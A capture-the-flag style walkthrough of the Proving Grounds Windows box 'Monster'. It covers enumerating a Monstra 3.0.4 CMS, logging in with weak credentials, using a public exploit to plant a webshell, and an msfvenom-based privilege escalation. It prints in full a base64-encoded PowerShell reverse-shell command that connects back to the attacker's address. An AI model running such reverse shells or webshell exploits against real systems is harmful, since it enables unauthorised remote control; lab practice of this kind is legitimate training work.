---
title: "Monster"
date: 2025-06-20
categories:
  - Proving Grounds
  - Windows
tags:
  - Proving Grounds
  - Windows
---


# Monster 🔹
<!-- more -->

## Enumeration

![](../assets/Pasted%20image%2020250313201347.png)

Web server.

![](../assets/Pasted%20image%2020250313202342.png)

Using `feroxbuster`, we discover a blog by `monstra 3.0.4`.

![](../assets/Pasted%20image%2020250313203003.png)

And the admin panel.

![](../assets/Pasted%20image%2020250313203157.png)

Add `monster.pg` to `/etc/hosts`.

![](../assets/Pasted%20image%2020250313204511.png)

## Initial Access

Trying password, we enter with `admin:wazowski`.

![](../assets/Pasted%20image%2020250313204626.png)

Using `searchsploit`.

![](../assets/Pasted%20image%2020250313204716.png)

We get `52038.py` but we have to edit it and give it indentation.

![](../assets/Pasted%20image%2020250313205444.png)

Going to that URL, we see the webshell.

![](../assets/Pasted%20image%2020250313205518.png)

Putting an encoded PowerShell reverse shell and starting a listener, we get a reverse shell.

```bash
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMwA2ACIALAA5ADkAOQA5ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbmRgYnl0ZSwAMAAsACQAc2VuZGJ5dGUuTGVuZ3RoKTsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

![](../assets/Pasted%20image%2020250313205924.png)

## Privilege Escalation

Get local flag.

![](../assets/Pasted%20image%2020250313211111.png)

![](../assets/Pasted%20image%2020250313220046.png)

![](../assets/Pasted%20image%2020250313220133.png)

Transfer the script after generating an `msfvenom` reverse shell and change the path to it in the script.

![](../assets/Pasted%20image%2020250313232428.png)

Wait after executing it and...

![](../assets/Pasted%20image%2020250313232449.png)

## Post Exploitation

Get the flag.

328bcdxxxxxxxxxxxb243c8a8e6
